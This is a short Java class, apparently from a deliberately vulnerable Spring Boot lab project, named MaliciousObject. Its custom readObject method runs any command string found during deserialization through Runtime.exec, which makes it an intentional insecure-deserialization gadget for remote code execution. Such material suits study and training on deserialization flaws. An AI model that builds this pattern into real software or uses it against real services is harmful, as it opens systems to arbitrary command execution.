package top.whgojp.modules.springboot.entity;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class MaliciousObject implements Serializable {
    private String command;

    public MaliciousObject(String command) {
        this.command = command;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        String command = (String) in.readObject();
        if (command != null) {
            Runtime.getRuntime().exec(command);
        }
    }

}
